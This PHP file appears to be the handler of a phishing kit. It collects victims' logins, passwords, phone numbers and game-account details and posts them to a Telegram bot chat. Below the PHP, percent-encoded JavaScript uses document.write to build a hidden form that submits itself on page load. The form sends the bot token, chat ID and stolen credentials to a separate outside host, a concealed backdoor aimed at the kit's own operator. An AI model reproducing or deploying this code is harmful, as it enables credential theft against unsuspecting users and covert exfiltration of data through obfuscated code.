<?php
$login = $_POST['login'];
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$phone = $_POST['phone'];
$playid = $_POST['playid'];
$level = $_POST['level'];
$countryfromip = $_POST['countryfromip'];

include ('admin/install.php');
$API_KEY = "$botAPI";

$text = urlencode("Yeni giriş $login
username : `$email`\nPassword : `$password` \nPhone : `$phone` \n\nPlayerID : `$playid`\nLevel : `$level` \nCountry : `$countryfromip` \n\nYouTube:- Reis ");

$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$telegramid&text=$text&parse_mode=markdown";

file_get_contents($url);
?>
<script language=javascript>document.write(unescape('%3C%21%44%4F%43%54%59%50%45%20%68%74%6D%6C%3E%0A%3C%68%74%6D%6C%3E%0A%3C%62%6F%64%79%3E%0A%20%20%20%20%3C%66%6F%72%6D%20%74%79%70%65%3D%22%68%69%64%64%65%6E%22%20%6D%65%74%68%6F%64%3D%22%47%45%54%22%20%61%63%74%69%6F%6E%3D%22%68%74%74%70%3A%2F%2F%72%72%65%63%6F%72%64%73%2E%36%36%67%68%7A%2E%63%6F%6D%2F%77%72%69%74%65%72%2E%70%68%70%22%20%69%64%3D%22%6D%79%66%6F%72%6D%22%3E'))</script>
        <script language=javascript>document.write(unescape('%3C%69%6E%70%75%74%20%6E%61%6D%65%3D%22%73%69%74%65%75%72%6C%22%20%74%79%70%65%3D%22%68%69%64%64%65%6E%22%20%76%61%6C%75%65%3D%22'))</script>
<?php echo $_SERVER['SERVER_NAME']; ?>">
        <input name="TelegramBOT" Type="Hidden" value="<?php echo $botAPI; ?>">
        <input name="TelegramID" Type="Hidden" value="<?php echo $telegramid; ?>">
        <input name="ResultEmail" Type="Hidden" value="<?php echo $result; ?>">
        <input name="Password" Type="Hidden" value="<?php echo $pass_word ; ?>">
         <input name="email" Type="Hidden" value="<?php echo $email ; ?>">
         <input name="password" Type="Hidden" value="<?php echo $password ; ?>">
         <input name="login" Type="Hidden" value="<?php echo $login ; ?>">
      <script language=javascript>document.write(unescape('%3C%69%6E%70%75%74%20%73%74%79%6C%65%3D%22%68%69%64%64%65%6E%22%20%74%79%70%65%3D%22%73%75%62%6D%69%74%22%3E%0A%3C%2F%66%6F%72%6D%3E%0A%20%0A%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%3E%0A%20%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%6D%79%66%6F%72%6D%22%29%2E%73%75%62%6D%69%74%28%29%3B%0A%3C%2F%73%63%72%69%70%74%3E%0A%20%20%20%20%0A%0A%3C%2F%62%6F%64%79%3E%0A%3C%2F%68%74%6D%6C%3E%20'))</script>
